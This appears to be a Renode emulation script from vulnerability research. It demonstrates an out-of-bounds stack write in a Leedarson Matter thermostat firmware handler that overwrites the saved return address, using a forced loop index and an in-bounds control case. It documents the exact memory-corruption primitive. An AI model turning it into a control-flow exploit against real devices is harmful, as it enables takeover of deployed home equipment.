:name: MT-04 Leedarson Thermostat SetWeeklySchedule OOB write sub_800E1D0 -> saved-LR
:description: Drives the REAL SetWeeklySchedule handler sub_800E1D0 of the real Leedarson Matter firmware on the emulated EFR32MG24 and demonstrates the out-of-bounds transitionTime store reaching the saved-return-address slot of the stack frame.
#
# ============================ SCOPE OF PROOF ============================
# This is a FORCED-INDEX demonstration. WHAT IS FORCED:
#   * loop index R5 = 16 (natural code increments R5 via TLV element count)
#   * the Next() gate at 0x800E2CA..0x800E2D0 is skipped (we enter the loop
#     body at 0x800E2D2, just past it)
# WHY: the natural TLV iterator (bl 0x800e178 = TLVReader::Next) requires a
#   live TLVReader/heap/object graph that cannot be driven standalone in this
#   register-level harness.
# WHAT IS REAL (unmodified, straight from the shipped firmware):
#   * the store instructions themselves (strh r2,[r3,#-104] / [r3,#-100])
#   * the effective-address arithmetic (add r3,sp,#0x3b0 ; add r3,r3,r5,lsl#3)
#   * the transitionTime source slot (ldrh r2,[sp,#0x2f8], attacker 16-bit,
#     unvalidated)
#   * the stack frame geometry (SP after PUSH.W {R4-R10,LR} + SUB SP,#0x3B0)
#
# ============================ BUG GEOMETRY =============================
# sub_800E1D0 @0x800E1D0: PUSH.W {R4-R10,LR} (8 regs = 0x20) then SUB SP,#0x3B0.
# Relative to the final SP:
#   buffer base var_68 = SP+0x348 ; saved R10 = SP+0x3C8 ; saved LR = SP+0x3CC.
# Loop body writes element[R5] at EA = SP+0x348 + R5*8.
# Capacity = 0x68 = 104 bytes = 13 slots (indices 0..12).
# At R5=16 the store `strh r2,[r3,#-100]` @0x800E2E2 writes SP+0x3CC =
# saved-LR low half; r2 = transitionTime = ldrh [sp,#0x2f8] (attacker 16-bit).
#
# With SP = 0x20010000:
#   transitionTime source slot  SP+0x2F8 = 0x200102F8
#   saved R10 slot              SP+0x3C8 = 0x200103C8
#   saved LR slot               SP+0x3CC = 0x200103CC
#
# The forced-index body (enter 0x800E2D2, 6 instructions) executes:
#   mov r4,r5 ; ldrh r2,[sp,#0x2f8] ; add r3,sp,#0x3b0 ; add r3,r3,r5,lsl#3 ;
#   strh r2,[r3,#-104] -> 0x200103C8 ; strh r2,[r3,#-100] -> 0x200103CC

$bin=@scripts/silabs-vuln/mt04_leedarson.elf
include @scripts/silabs-vuln/boot_mg24.resc

emulation RunFor "0.4"
pause

# ==================== CASE A: R5=16 (OOB, reaches saved LR) ====================
# Pre-seed the frame slots.
sysbus WriteDoubleWord 0x200102F8 0x0000BEEF
sysbus WriteDoubleWord 0x200103C8 0xAAAAAAAA
sysbus WriteDoubleWord 0x200103CC 0xEEEEEEE1

# Forced-index call contract.
sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 5  0x00000010
sysbus.cpu PC 0x800E2D2

echo ">>> CASE A (R5=16, FORCED index past Next() gate)"
echo ">>> BEFORE: saved-LR slot  @0x200103CC ="
sysbus ReadDoubleWord 0x200103CC
echo ">>> BEFORE: saved-R10 slot @0x200103C8 ="
sysbus ReadDoubleWord 0x200103C8

sysbus.cpu Step 6

echo ">>> AFTER:  saved-LR slot  @0x200103CC (expect 0xEEEEBEEF) ="
sysbus ReadDoubleWord 0x200103CC
echo ">>> AFTER:  saved-R10 slot @0x200103C8 (expect 0xAAAABEEF) ="
sysbus ReadDoubleWord 0x200103C8

# ==================== CASE B: R5=13 (in-bounds boundary contrast) =============
# At R5=13, EA = SP+0x3B0+13*8 -> stores hit SP+0x3B0 and SP+0x3B4, i.e.
# 0x200103B0 / 0x200103B4 -- NOT the saved-LR slot. Proves the 13-slot bound.
sysbus WriteDoubleWord 0x200102F8 0x0000BEEF
sysbus WriteDoubleWord 0x200103CC 0xEEEEEEE1
sysbus WriteDoubleWord 0x200103B4 0xCCCCCCCC
sysbus WriteDoubleWord 0x200103B0 0xDDDDDDDD

sysbus.cpu SetRegister 13 0x20010000
sysbus.cpu SetRegister 5  0x0000000D
sysbus.cpu PC 0x800E2D2

echo ">>> CASE B (R5=13, in-bounds boundary contrast)"
echo ">>> BEFORE: saved-LR slot @0x200103CC ="
sysbus ReadDoubleWord 0x200103CC

sysbus.cpu Step 6

echo ">>> AFTER:  saved-LR slot @0x200103CC (expect UNCHANGED 0xEEEEEEE1) ="
sysbus ReadDoubleWord 0x200103CC
echo ">>> AFTER:  slot13 hi     @0x200103B4 (expect written 0xCCCCBEEF) ="
sysbus ReadDoubleWord 0x200103B4
